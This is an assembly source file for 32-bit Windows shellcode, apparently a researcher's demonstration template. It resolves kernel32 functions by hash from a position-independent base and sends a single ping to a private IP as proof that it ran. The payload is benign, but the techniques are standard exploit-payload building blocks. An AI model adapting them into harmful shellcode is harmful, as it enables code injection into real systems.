; Shellcode to ping an IP address
; Written for NASM assembler (http://www.nasm.us) by Didier Stevens
; https://DidierStevens.com
; Use at your own risk
;
; History:
;   2010/02/16: start
;   2010/02/17: cleanup

BITS 32

KERNEL32_HASH equ 0x000d4e88
KERNEL32_NUMBER_OF_FUNCTIONS equ 3
KERNEL32_LOADLIBRARYA_HASH			equ 0x000d5786
KERNEL32_GETPROCADDRESS_HASH		equ 0x00348bfa
KERNEL32_LOCALALLOC_HASH				equ 0x00035542

segment .text
	call geteip
geteip:
	pop ebx

  ; Setup environment kernel32
	lea esi, [KERNEL32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [KERNEL32_HASHES_TABLE-geteip+ebx]
	push esi
	push byte KERNEL32_NUMBER_OF_FUNCTIONS
	push KERNEL32_HASH
	call LookupFunctions

	; Setup Iphlpapi.dll
	lea esi, [IPHLPAPIDLL-geteip+ebx]
	push esi
	call [KERNEL32_LOADLIBRARY-geteip+ebx]
	push eax
	lea esi, [ICMPCREATEFILE-geteip+ebx]
	push esi
	push eax
	call [KERNEL32_GETPROCADDRA-geteip+ebx]
	mov [IPHLPAPIDLL_ICMPCREATEFILE-geteip+ebx], eax
	pop eax
	push eax
	lea esi, [ICMPSENDECHO-geteip+ebx]
	push esi
	push eax
	call [KERNEL32_GETPROCADDRA-geteip+ebx]
	mov [IPHLPAPIDLL_ICMPSENDECHO-geteip+ebx], eax
	pop eax
	lea esi, [ICMPCLOSEHANDLE-geteip+ebx]
	push esi
	push eax
	call [KERNEL32_GETPROCADDRA-geteip+ebx]
	mov [IPHLPAPIDLL_ICMPCLOSEHANDLE-geteip+ebx], eax

	; LocalAlloc(IN UINT uFlags, IN SIZE_T uBytes);
	push byte REPLYBUFFER_SIZE
	push byte 0x00 ; LMEM_FIXED
	call [KERNEL32_LOCALALLOC-geteip+ebx]
	mov [REPLYBUFFER-geteip+ebx], eax

	; Send the ICMP echo
	call [IPHLPAPIDLL_ICMPCREATEFILE-geteip+ebx]
	push eax
	push 1000
	push REPLYBUFFER_SIZE
	push DWORD [REPLYBUFFER-geteip+ebx]
	push 0x00
	push DWORD [REQUESTDATA_SIZE-geteip+ebx]
	lea esi, [REQUESTDATA-geteip+ebx]
	push esi
	push dword [IPADDRESS-geteip+ebx]
	push eax
	call [IPHLPAPIDLL_ICMPSENDECHO-geteip+ebx]
	call [IPHLPAPIDLL_ICMPCLOSEHANDLE-geteip+ebx]

	ret

%include "sc-api-functions.asm"

KERNEL32_HASHES_TABLE:
	dd KERNEL32_LOADLIBRARYA_HASH
	dd KERNEL32_GETPROCADDRESS_HASH
	dd KERNEL32_LOCALALLOC_HASH

KERNEL32_FUNCTIONS_TABLE:
KERNEL32_LOADLIBRARY			dd 0x00000000
KERNEL32_GETPROCADDRA			dd 0x00000000
KERNEL32_LOCALALLOC				dd 0x00000000

IPHLPAPIDLL_ICMPCREATEFILE		dd 0x00000000
IPHLPAPIDLL_ICMPSENDECHO			dd 0x00000000
IPHLPAPIDLL_ICMPCLOSEHANDLE		dd 0x00000000

IPHLPAPIDLL:
	db "Iphlpapi.dll", 0
ICMPCREATEFILE:
	db "IcmpCreateFile", 0
ICMPSENDECHO:
	db "IcmpSendEcho", 0
ICMPCLOSEHANDLE:
	db "IcmpCloseHandle", 0

REPLYBUFFER				dd 0x00000000
REPLYBUFFER_SIZE equ 40 ; size of the reply buffer should be at least the size of the request buffer + 8

IPADDRESS db 10,11,12,13 ; the destination IP address: 10.11.12.13
REQUESTDATA_SIZE dd 19  ; size of the REQUESTDATA buffer, need updating when you change the size of REQUESTDATA
REQUESTDATA:
	db "Ping from shellcode"
